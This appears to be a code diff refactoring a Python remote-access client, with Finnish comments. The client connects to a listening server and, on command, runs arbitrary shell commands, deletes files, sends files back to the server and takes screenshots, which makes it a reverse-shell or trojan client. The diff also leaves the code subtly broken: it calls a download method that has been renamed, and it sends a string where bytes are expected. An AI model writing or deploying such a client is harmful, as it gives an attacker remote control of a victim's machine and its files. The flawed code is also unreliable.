@@ -3,12 +3,19 @@ import subprocess
 import os
 import pyautogui
 
+from main_server import MainServer
+
 class MainClient:
-    def __init__(self):
-        pass
+    def __init__(self, ip:str, port:int):
+        self.ip = ip
+        self.port = port
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((self.ip, self.port))
+        
 
     
-    def delete(s, command):
+    def delete(self, s, command):
+        s = self.s
         filename = command.split()[1]
         if os.path.exists(filename):
             os.remove(filename)
@@ -16,7 +23,8 @@ class MainClient:
         else:
             s.send(b'file not found')
 
-    def download(s,command):
+    def upload(self, s,command):
+        s = self.s
         filename = command.split()[1]
         if os.path.exists(filename):
             with open(filename, 'rb') as f:
@@ -28,8 +36,9 @@ class MainClient:
         else:
             s.send('File not found')
 
-    def vaihda_dirri(s,command):
+    def change_dir(self, s,command):
         #splitataan välilyönneistä ja otetaan indeksi 1 talteen
+        s = self.s
         path = command.split()[1]
         #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
         if os.path.exists(path):
@@ -39,7 +48,8 @@ class MainClient:
         else:
             s.send(b'Invalid directory name')
 
-    def aja_komento(s,command):
+    def run_command(self, s, command):
+        s = self.s
         # käytetään subprocessin run functiota. 
         # tarvitaan shelli sekä halutaan ottaa tulos talteen -> capture_output
         result = subprocess.run(command, shell=True, capture_output=True)
@@ -50,36 +60,32 @@ class MainClient:
         else:
             s.send(b'Invalid command')
 
-    def main():
-
-        host_ip = '127.0.0.1' #172.20.16.62
-        port    = 8888
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host_ip, port))
-
+    def main(self):        
+        s = self.s
         while True:
             #otetaan käsky talteen. 1kilotavu riittää. decodtaan bytet takaisin stringeiksi
-            command = s.recv(4096).decode('ISO-8859-1')
+            command = self.s.recv(4096).decode('ISO-8859-1')
             if command == 'exit':
-                s.close()
+                self.s.close()
                 break
             elif command.startswith('cd') and len(command) > 3:
-                vaihda_dirri(s,command)
+                self.change_dir(s,command)
             elif command.startswith('download'):
-                download(s,command)
+                self.download(s,command)
             elif command == 'screen':
                 screenshot = pyautogui.screenshot()
                 screenshot.save("screenshot.png")
             elif command.startswith('del'):
-                delete(s,command)
+                self.delete(s,command)
             # elif command.startswith('upload'):
             #     upload(s,command)
             #     continue
             else:
                 #ajetaan komento sekä lähetetään tulos serverille. 
-                aja_komento(s,command)
+                self.run_command(s,command)
                 
 
 
 if __name__ == '__main__':
-    main()
+    appi = MainClient('127.0.0.1', 8888)
+    appi.main()
